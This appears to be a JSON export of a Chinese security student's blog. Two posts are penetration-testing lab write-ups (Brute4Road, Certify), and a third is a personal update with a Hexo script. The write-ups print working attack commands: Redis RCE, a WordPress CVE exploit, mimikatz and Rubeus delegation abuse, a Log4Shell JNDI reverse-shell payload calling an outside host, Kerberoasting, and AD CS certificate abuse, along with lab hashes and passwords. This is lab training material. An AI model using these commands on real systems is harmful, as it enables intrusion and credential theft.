[{"path":"/2025/10/17/1/","content":"ada"},{"title":"春秋云镜-Brute4Road","path":"/2025/10/17/春秋云镜-Brute4Road/","content":"flag01fscan： 发现有Redis未授权，尝试写计划任务弹shell，但是权限不够。 可以打主从复制，服务端上部署恶意Redis服务：[[5.0.5) RCE (github.com)](https://github.com/n0b0dyCN/redis-rogue-server|n0b0dyCN/redis-rogue-server: Redis(5.0.5) RCE (github.com)]] 先监听8888端口： python3 redis-rogue-server.py --rhost 39.99.144.205 --lhost IP 开启交互式shell： python -c import pty; pty.spawn(/bin/bash) 如果没有交互式shell，将会有诸多弊端： 没有 TTY 设备： 许多需要终端交互的命令（如 su, sudo, ssh）可能无法正常运行，并提示 “must be run from a terminal” 之类的错误。 功能受限： 无法使用 Tab 自动补全、方向键浏览历史命令等便捷功能。 不稳定的会话： 使用 Ctrl+C 可能会直接终止整个反向 shell 连接。 想读flag，但是权限不够： 尝试suid提权： find / -user root -perm -4000 -print 2/dev/null 看到有base64，可以读文件 这样来找flag可以抛弃掉错误，防止报出来一堆： find / -name flag* 2/dev/null base64 /home/redis/flag/flag01 | base64 --decode 小tips：这样可以后台运行可执行文件，防止一个shell被卡死 nohup ./ flag02内网信息搜集： 五台主机： (icmp) Target 172.22.2.18 is alive(icmp) Target 172.22.2.3 is alive(icmp) Target 172.22.2.7 is alive （已拿下）(icmp) Target 172.22.2.34 is alive(icmp) Target 172.22.2.16 is alive 有一个WP网站，想打了。 扫描一下 proxychains4 wpscan --url http://172.22.2.18 该组件版本小于6.9.0时存在RCE漏洞，以下是利用脚本：（后面再来细究一下原理）https://github.com/biulove0x/CVE-2021-25003 python .py -t http://xxx 连接蚁剑： 发现数据库配置文件泄露： 这里登错了（不要用root！） flag2： flag03根据提示，这里能发现一些密码字典： 这里不够细，应该多观察一下SQL语句的，把limit限制去掉： 这样就dump出来1000多个。 用fscan爆破一下： MDUT连进去，拿shell： 权限低： 尝试甜土豆提权： C:/Users/Public/sweetpotato.exe -a whoami 直接读flag： flag04systeminfo 发现域环境： 上传mimikatz，抓取哈希值： privilege::debug sekurlsa::logonpasswords 3b32d2637bc6c20aff34a72f52aa32fd MSSQL账户的NTLM哈希 这里似乎无法打哈希传递，因为admin$共享未开启。 打约束委派攻击： AdFind.exe -b DC=xiaorang,DC=lab -f ((samAccountType=805306369)(msds-allowedtodelegateto=*)) msds-allowedtodelegateto 这里先用域服务账号请求一个TGT： .\\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:3b32d2637bc6c20aff34a72f52aa32fd /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap 1.txt doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2U81ujXxUEQydmZUkWVhsqS8l0foHgFgM/ubtCFJJPBFrOP7+EAoonD0OxXUEjrc3xP93mPSmOG5WPt8K41gWkU4WJSME1PWZ3kN12cCx7HiletUDDychNIAgfEsknwWfrIM8c9rwVT3Y8PiNZfLADdnuAtBq8Hf062P/N/J8f3zurnFPCVbvdarWVYG9EDtnpzhJx1/Vn0ckYsB7+b/vlBM+SyW40hefiqBnxKmjwd7aelLAMgWbiAbnq5tJM5nUNqCR/QKh68Ox2z1IWdAf7l7ftuW6o372YVonjwYlcKg+05U6S6fb/aAIdCu94M8QPNrHt9AIfcAENTjoREGypw89QBrIJnZcoAFGizQ1mft9bVG55vIZeuaxf57fDEQ+GbNgQUGQb2VvECpmr8V+5InazA+MdNhhzOai4Tw1TC1mbmqaN+FQFUBKnHPny6q2IxezvBqWEuIC3NoFA303v/9EDduXRwgzsJlBDPtzSl02p+DGhIoRFNXY01RX0jn1uHuLue1vgKbCzXmXjA/NQx2gCFt3tLmh/MEttodjViOCL+y6GvCzFUARSC19Q0HJifIRTPSc6lXtATgu5d+gzQZ4/XBCB6yMvzUZVaRi8p4XvgpoxsxYmBANGMoQIxOefF524d1pIvLV9/vuxLBUOAQdXkJQf2lNBjsVuY157RBjkFYAvkUOHovFZfYXUtaDSaVQlygWSGqutzjUvqB11c/F8nDELOQvUpTH5EfjEWacP46i+IXbnIZazcoSYgEw7dPq/p2Flqo3XbilbuVDmc6aoo9Rb9s4m6orFaLRuJUSS61IBpgNnBDOAOgjQuP8mjJEV1cUV845otRpUHzr17jbfG84l8dW2KOwiW+RiZs5W+EuBrCfee+ei2BajChIAlQ0wEUMjDiTTwVNuNy8DrC3zeKlvreFLTjULnlN1gxbHG1BU6bRumRKy2v8sd2C6vkns69c8vhc5qq01rC6xviPExGRh1mroxmfuA78eAR6RVSWgo0ulpBu0mfh6LUCSR9I2KJQhaeUwBiFfgH4qg2wFD5bbGw4K2Kd8qPqT0UmX7j2uIBBu1/V8BXdXPGrDY/+Fs9RGj8kftM+jtmin52ZB1QeRtrUb9yeOlOYgA4kVBGM0XVcw1NXgMrcuUM97XU3AnkazCwu9Liri90TQZBa/lYN4j+61kRTh+ffiAeFzUWEC2Un4NxpT7KglNmwGRJdJgBo5tYh/cbpI2/NNzAnbh7g6SNKprXARIp07lCKX/EZ8omD/EWzn29vNCC3lKwR5bSm2aBRoihgGdaRM0k90Nrxsx1DWQBqP1VDoRez8NuI7V4yVy83Mje3uRToSgIeX853gb5DOUtBRi1r4gk2Ekvtf2ASckLAULV2zQ7oHaDjYAaMMsLvZc4pGXOaIuEXJGByWvMZzkHz1HK488h+XO/z3yWLMMZgyrNDQH+mYZI0M+1Ur1t4cVkqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDtUeoR/JiD5oBCrWz9F7tloQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MTAxNDE0Mjg0OVqmERgPMjAyNTEwMTUwMDI4NDlapxEYDzIwMjUxMDIxMTQyODQ5WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== 将票据注入内存： .\\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2U81ujXxUEQydmZUkWVhsqS8l0foHgFgM/ubtCFJJPBFrOP7+EAoonD0OxXUEjrc3xP93mPSmOG5WPt8K41gWkU4WJSME1PWZ3kN12cCx7HiletUDDychNIAgfEsknwWfrIM8c9rwVT3Y8PiNZfLADdnuAtBq8Hf062P/N/J8f3zurnFPCVbvdarWVYG9EDtnpzhJx1/Vn0ckYsB7+b/vlBM+SyW40hefiqBnxKmjwd7aelLAMgWbiAbnq5tJM5nUNqCR/QKh68Ox2z1IWdAf7l7ftuW6o372YVonjwYlcKg+05U6S6fb/aAIdCu94M8QPNrHt9AIfcAENTjoREGypw89QBrIJnZcoAFGizQ1mft9bVG55vIZeuaxf57fDEQ+GbNgQUGQb2VvECpmr8V+5InazA+MdNhhzOai4Tw1TC1mbmqaN+FQFUBKnHPny6q2IxezvBqWEuIC3NoFA303v/9EDduXRwgzsJlBDPtzSl02p+DGhIoRFNXY01RX0jn1uHuLue1vgKbCzXmXjA/NQx2gCFt3tLmh/MEttodjViOCL+y6GvCzFUARSC19Q0HJifIRTPSc6lXtATgu5d+gzQZ4/XBCB6yMvzUZVaRi8p4XvgpoxsxYmBANGMoQIxOefF524d1pIvLV9/vuxLBUOAQdXkJQf2lNBjsVuY157RBjkFYAvkUOHovFZfYXUtaDSaVQlygWSGqutzjUvqB11c/F8nDELOQvUpTH5EfjEWacP46i+IXbnIZazcoSYgEw7dPq/p2Flqo3XbilbuVDmc6aoo9Rb9s4m6orFaLRuJUSS61IBpgNnBDOAOgjQuP8mjJEV1cUV845otRpUHzr17jbfG84l8dW2KOwiW+RiZs5W+EuBrCfee+ei2BajChIAlQ0wEUMjDiTTwVNuNy8DrC3zeKlvreFLTjULnlN1gxbHG1BU6bRumRKy2v8sd2C6vkns69c8vhc5qq01rC6xviPExGRh1mroxmfuA78eAR6RVSWgo0ulpBu0mfh6LUCSR9I2KJQhaeUwBiFfgH4qg2wFD5bbGw4K2Kd8qPqT0UmX7j2uIBBu1/V8BXdXPGrDY/+Fs9RGj8kftM+jtmin52ZB1QeRtrUb9yeOlOYgA4kVBGM0XVcw1NXgMrcuUM97XU3AnkazCwu9Liri90TQZBa/lYN4j+61kRTh+ffiAeFzUWEC2Un4NxpT7KglNmwGRJdJgBo5tYh/cbpI2/NNzAnbh7g6SNKprXARIp07lCKX/EZ8omD/EWzn29vNCC3lKwR5bSm2aBRoihgGdaRM0k90Nrxsx1DWQBqP1VDoRez8NuI7V4yVy83Mje3uRToSgIeX853gb5DOUtBRi1r4gk2Ekvtf2ASckLAULV2zQ7oHaDjYAaMMsLvZc4pGXOaIuEXJGByWvMZzkHz1HK488h+XO/z3yWLMMZgyrNDQH+mYZI0M+1Ur1t4cVkqjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDtUeoR/JiD5oBCrWz9F7tloQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MTAxNDE0Mjg0OVqmERgPMjAyNTEwMTUwMDI4NDlapxEYDzIwMjUxMDIxMTQyODQ5WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg== 注入成功，读取flag： type \\\\DC.xiaorang.lab\\C$\\Users\\Administrator\\flag\\flag04.txt 关于最后约束委派攻击的比喻我：公司的普通员工老板：拥有所有机密文件的最高权限（域管理员）机密档案室：存放公司机密的房间（域控的C$共享）公司前台：负责验证身份和发放通行证（域控制器KDC）特权快递员：可以代表老板去档案室取文件（配置了约束性委派的服务账户）快递员的工牌：（服务账户的TGT）档案室有严格规定：只认老板本人或者他委派的特权快递员1、控制了快递员对应技术：通过密码喷洒、哈希传递或内存dump等方式，控制了服务账户2、跟前台说：我是特权快递员。老板让我替他取档案室的文件，但我没有他的直接授权。请给我开一张‘老板授权我办事’的证明。前台核实了我的快递员身份后，给了我一张证明，上面写着：持证快递员已获得老板授权，可办理相关业务。对应技术：这是 S4U2Self 过程。攻击者用服务账户的TGT，向KDC申请一张以老板身份（Administrator） 访问服务自身的可转发（Forwardable） 的ST票据。3、换取档案室通行证（S4U2Proxy）我拿着这张“老板授权书”和快递员工牌，再次回到前台，说：这是老板的授权书。现在请给我一张进入档案室的老板专属通行证。前台检查了三样东西： 快递员工牌有效。 授权书真实有效且允许转发。 最关键一步：前台翻看公司规章，确认这名快递员确实在“允许代老板取件”的名单上（这就是约束的含义，他只能去档案室，不能去其他禁区）。核查无误后，前台给了我一张真正的档案室通行证，上面写着老板的名字。对应技术：这是 S4U2Proxy 过程。攻击者用S4U2Self获得的票据作为凭据，向KDC申请以老板身份访问特定服务（如cifsDC2016） 的最终ST票据。4、我把这张伪造的老板通行证塞进自己的口袋（注入内存），并通过了档案室的门禁系统，窃取了机密文件对应技术：将最终获得的服务票据（ST）注入内存，然后访问目标服务，如执行 dir \\DC2016\\C$。","tags":["渗透"],"categories":["打靶记录"]},{"title":"春秋云镜-Certify","path":"/2025/10/15/春秋云镜-Certify/","content":"外网打点fscan扫一下： 有一个solr页面，而且有Log4j Log4Shell验证成功： http://39.99.159.154:8983/solr/admin/cores?action=$jndi:ldap://i8nw97.dnslog.cn 服务器上先用JNDI-Exploit起一个服务，并监听端口： java -jar JNDIExploit.jar -i IPnc -lvnp 80 Log4j2 Payload： $jndi:ldap://114.132.61.17:1389/Basic/ReverseShell/114.132.61.17/80 成功拿到shell： 提权 sudo grc --pty /bin/shpython3 -c import pty;pty.spawn(/bin/bash) 读取第一个flag： 内网渗透信息搜集证明机器出网，也可以用curl ip.sb 172.22.9.19 上传fscan，挂代理，这里略。可以看到还有三台机子： .7.26.47 fileserver SMB共享登录47是台fileserver，试一试SMB登录： proxychains4 impacket-smbclient 172.22.9.47 flag02在其中，还能够dump下来一个.db文件： 用Navicat打开：（这里应该dump name字段而非email!） 单独列出来一份user.txt和pass.txt，准备SMB爆破。 proxychains4 netexec smb 172.22.9.26 -u user.txt -p pass.txt --continue-on-success 爆破出来两个： xiaorang.lab\\zhangjian:i9XDE02pLVfxiaorang.lab\\liupeng:fiAzGwEMgTY 但是都登录不上rdp。 域渗透kerberoasting攻击根据flag2的提示，与SPN有关，要打kerberoasting 查一下有没有域用户的spn：（用zhangjian用户） proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf 已经确认了 zhangxia 和 chenchen 这两个用户账户是可以被“Kerberoast”的。 我们还dump到zhangxia和chenchen的两个哈希值：这里的哈希值是用对应用户的NTLM哈希值为密文，ST [[Kerberos协议#基础概念]] 为明文的方式，加密而来的密文。加密算法是对称加密，故我们可以对密文进行离线爆破。 $krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$63e2b10756ceff8fffe75823dbc48714$7976b1930ad8b3113c6ba1e0ce0039f1cf97431ce84694aa810ed7215e4f3b3eaae8895ffbff0736e40163dfc4b4efc17c1180ba8aab1d4ba051220b8255cea8766b6e6819f965c449f9dd8d51bc322ef3cc6f675ad9d5c30ddf6f73849c5ea53e68be26670dc02fd59a360bf6d6299ddc89030b964960a963befb3e17d8af2a7970d54967b770913184607ca60c3d021cceae99a1dd043a04080300a27abf5737dd24b807397c564ab91201da703e404e13dd2b5ec02ef45382c1c467585afc0b79a63ccf642835e0753a1e395b15bf177ab93604b1228de1f8d8c910c365f3afaf777546af09dd21f7b388f2b9b55888e6fdc51b2ce1ad12ad8f1331c0cbb395ee99ad31c431cc3b84376e69c24eb685099bfff060d5fdff972d8a76d2f4f292f8490eab00dc6818c5aca45d7364a83ccadd25d6e91beadec4ae00173b1818a8e3ff86626a1a0cf2477d234077e82f26a9cf33088e8b207d58b7671f2f414ec47924e67c06042a98542dd617623f03558a43b986e76c37adb53c9b2d64be4c4239ab5ffa4669c595c205fe020e61a8a03f3cd529294db58fadaeb5c4aa7c5072ad2dfc24fed5cc577eae5cc6433474f9a6796e6b359cda5a4fb4e0379d124c0e107aa6ca0332396dabf2e472054ec764971b506fe2951e231eae25d9c8f02af062e3dd1ccc99477ff2e431aae735f4f2da2fd1a817ff8102fd87055de7279bd5319f7bd8ca0bd6c46f11f487ac08deac215c8f2d7c63030d757171f2b076aa1f0b397e3fff106146e978c8ac6e278260d1ddd88777b1a3de21c077f46878d342352c7f075fe06a5e2dd7562b60b505072f6a910d6e8f94886dd1ecffa560ee18b3a1f479bacc1b906bdd6bbb9e9f4dea5cad23f5530d4eeff1c5544d19f13f6d9a6541034ebad9129626ebd1fbd25be76c628d3f780981fe6a7bd61c0249b9295dfdd45a7704e819a62b39f1879043df7b18c49a7f7da04eab525f388c5131c09964052e95073d17715fbd1a686210a455c0a147741ee27b47e7d21946f7e6e5664bfcdc9205bcfb25ed93deb00c22812e726fd9ecddb4be3829f6f970de6dfa2488be0d871929f0cb1b5ea24aa9e3be78a77b963eb2923ad3453b01bbcadfab1ce8b0d9190d9ec03bb041bbf48f35c49d150d2b6b1118ea248fc9e005c6b19fead5e62e6694345fc4d80b6329271a940f53cde8075f5e803231490bd219aea25224b1eab4ce2d3b88b7a526b2970e2e0167589a3a769ced716af1e77697dce067753d25652a80a045df08385c8797d03d1805fe1dad80f9666bec50860b3b8e6172318ceed32bacc7cc234fe1f080239db0d3026651c2336657045a4de355fb48ebc107916fc8a2cead667e66884cf8bced76dafc320ed8af5248cd84a7b9c0b4dc3555b30caf550f254d550d7f47cee021b7019ed9336509281e8da316c75c10d3bea9f9213b234f5a59db9732b7b6d314b8cf74fa2582173e8cbf8c62ad24ea29046b5d76cd029d008eed7f $krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$c6e65922c9f0a70160ef6de693090e2d$a9f8d961bd4234ab1d9c297c6bf89a638046913da23ce803a48e421ab9e83536139b181976f3b8aa8756aaa1d0b054bb6679cdd3efd12a1d7d429823ecf47b07add4cf6a9d83bf02fd97580238013dc7b34b518e6d8f08f6c5a5a379e8840e980cab486106879fc428ab3ee686ce826dced39248ceefb738d5ebfc1657760930dc7ca4673ed5bfd513c1fd25abd00cf5c88d7d832a89d7d73e5f9715337145eb37571daef8bed382268502018f46711a8d0c72a0ea1aff65b1e7e8cddbc57184b6210979a406e38219645a7d6262093f4d6b5a2cdd0d5b593e83592695b121d3aa3bd91a3d5425f06c34ff00654f1184d478aacc1ccb64d8a99a86761397a707b82038d250f5659fd84671073b7170c561fed642e00e20a91ac6fc67ac56055e9360496e041225676840abbffdb85e94fb5fdb7347f85820ed2caa0e6b432c6762c77cc84c834d1a65d98485b706129d6e97b31d622b1522d9f14d5ecb8ee4d4308d42e9fa703d9186ec992ef99ffcf5a3343669e498f49750c928f302cc75b797c820196dfa6e51a1a395105e5b52b770e099409d7dcedbd4bf47deb086e3c62a287dc38838ba1f89c8ce3cdec88dcaa87fbe8801a8ff4d68fdb8ca34662648c5541549f7b366fc277bd0a2891beba5c237c110df778607ba098d696b41806895394b4f0260cca2d1f19cadc65c378553be1a8ba3b26e6e59d09a3c48e8db06d1b7f866d3cef80401c4594c637fa0d27b1bac7a6c088bf5fe094d183531736e65a9152903b92cffccbe18451456cc82653f55b8a69fd98a510bd47528fdb5197e42175e36181a7bc02e90edae3197be89df49a23f440a7fd2ebae1e857b742cea5f0214dfaf8ed98bb6d8303c2c9e06c5cebeef161003791622a3e0a1f15a6d00ecb75e940aab5fe859bb6d506d52357ad97a4f92f22caa8b6fd3679f46f7f4aba224b3ffd123685c84c25e089ba4f2237332fd58343d227a6fbd8ab8b403560f4b276c27526b761fbe53f121fee178a59eb157fd95eda59c21a6af6e608d9d89d3b7d9c636f2934942e845842fd9bf50b2eeb7dd68dd6ff305efbae34dbc8a1d5f30545fe267dbd2ee7625d653698e7d14135c182a0fd462c5d47248bf7ed9a26254f0f272e420edac6477f3bd8f9072c84a3a3c8c9a5b236805d61feb2e166522370bb60e5dd2f4ee372df47a3c3824f1f641d2d4960205bdb9e6eaa0c6f6f9fc540903dd6968f1018bd024784432ffa1aae02804cbcc180285f2c070daff261fc631719dfaa0825550dc3bce6608e54c4adc165fcb9672cb6fbaeb136837201dfe030c89ff5a06de70b673352ba8e309ef67c3e5a2d00c959c943f61be8c67cf78b47445676114ce3b7cb0cd64a439d714155330d1cd41c4536107f9308b7bee3f018d22e0ecbbcda23ae41290c30a802650f9450951665b7893f45b780c4b515fd7c2b11e275a6dabe40e3e2800e5990986f66cd3415c379b6efe86de5cfbf703027184737be1e251427a30 用hashcat分别进行破解： hashcat -a 0 -m 13100 zhangxia.txt /usr/share/wordlists/rockyou.txt zhangxia/MyPass2@@6chenchen/@Passw0rd@ 查看用户的证书情况：(这行命令是在执行一次针对 Active Directory 证书服务 (AD CS) 的安全审计和漏洞发现。) proxychains4 certipy-ad find -u zhangxia@xiaorang.lab -password MyPass2@@6 -dc-ip 172.22.9.7 -vulnerable -stdout 修改etchosts，避免超时：这里我不懂具体要怎么改。。这里需要加上域控的名字.xiaorang.lab这个名字在fscan扫除的右边（我图忘记粘贴，环境已经关了。。） 用RDP进行登录：注意用户名要加上@xiaorang.lab 又好了。 proxychains4 certipy-ad req -u zhangxia@xiaorang.lab -p MyPass2@@6 -target 172.22.9.7 -dc-ip 172.22.9.7 -ca xiaorang-XIAORANG-DC-CA -template XR Manager -upn administrator@xiaorang.lab 拿到生成的administrator.pfx可以获取域管哈希： proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7 拿到域管哈希2f1b57eefb2d152196836b0516abea80，后面直接PTH即可：flag3： proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26 type c:\\users\\administrator\\flag\\flag03.txt flag4：登录到DC proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7"},{"title":"打赢复活赛了","path":"/2025/10/14/打赢复活赛了/","content":"复活了My blog 复活了！ 由于之前我github两步验证的码没保存，弄了半天还是修不好，放弃了。。之前的东西都无了 一些近况今天是2025.10.14下午3点，有点困了，无聊写点东西记录记录最近的事情。 从九月十号左右就开始投简历找实习了，一直没下文。。几乎O个能约上面试，我都怀疑我简历是哪里有问题？？ 在学校的时间还是很舒服的，每天有好吃的，有充足的时间学习。但是现在真的需要找实习了，还没找到有点焦虑。某种意义上的围城罢了，等真正去了又会很怀念校园的时光吧。 希望这学期能找到甲方大厂的实习，那就圆满了，唯一缺点就是又要和女朋友分开了，真的舍不得。如果去了别的地方，将会是最长的一次异地（3个月+寒假） 关于博客的图片管理下次忘了照抄就好了，包好用的： 然后每次写好文档后，用一个Py脚本处理一下路径，就可以把它们发到网上去了。 import osimport sysdef process_markdown_files(directory_path): 遍历指定目录下的所有.md文件，并替换图片路径中的 / 为 /。 Args: directory_path (str): 要处理的Hexo博客文章目录路径。 # 检查目录是否存在 if not os.path.isdir(directory_path): print(f错误：目录 directory_path 不存在或不是一个有效的目录。) return print(f开始处理目录：directory_path ) # 统计修改了多少文件 files_modified_count = 0 # 统计处理了多少文件 files_processed_count = 0 # 遍历目录下的所有文件 for filename in os.listdir(directory_path): # 只处理.md文件 if filename.endswith(.md): files_processed_count += 1 file_path = os.path.join(directory_path, filename) try: # 读取文件内容 with open(file_path, r, encoding=utf-8) as f: original_content = f.read() # 执行替换操作 # 将 / 替换为 / modified_content = original_content.replace(/, /) # 检查内容是否真的发生了改变 if original_content != modified_content: # 如果有变化，则写回文件 with open(file_path, w, encoding=utf-8) as f: f.write(modified_content) print(f[已更新] filename) files_modified_count += 1 else: # 如果没有变化，则不做任何操作 print(f[无需更改] filename) except Exception as e: print(f处理文件 filename 时发生错误: e) print( --------------------) print(处理完成！) print(f总共检查了 files_processed_count 个 Markdown 文件。) print(f成功更新了 files_modified_count 个文件。)# --- 主程序入口 ---if __name__ == __main__: # 请在这里修改为你的实际路径 # 使用 r 可以防止反斜杠被转义 hexo_posts_path = rC:\\Users\\lenovo\\Documents\\Hexo-blog\\source\\_posts process_markdown_files(hexo_posts_path) md文章的配置---# 基本信息title: title date: date tags: []categories: []description: # excerpt 也可 # 封面cover: banner: poster: # 海报（可选，全图封面卡片） topic: 标题上方的小字 # 可选 headline: 大标题 # 必选 caption: 标题下方的小字 # 可选 color: 标题颜色 # 可选# 插件sticky: # 数字越大越靠前mermaid:katex: mathjax: # 可选topic: # 专栏 idauthor: references:comments: # 设置 false 禁止评论indexing: # 设置 false 避免被搜索breadcrumb: # 设置 false 隐藏面包屑导航leftbar: rightbar:h1: # 设置为 隐藏标题type: # tech/story---","tags":["杂谈"]}]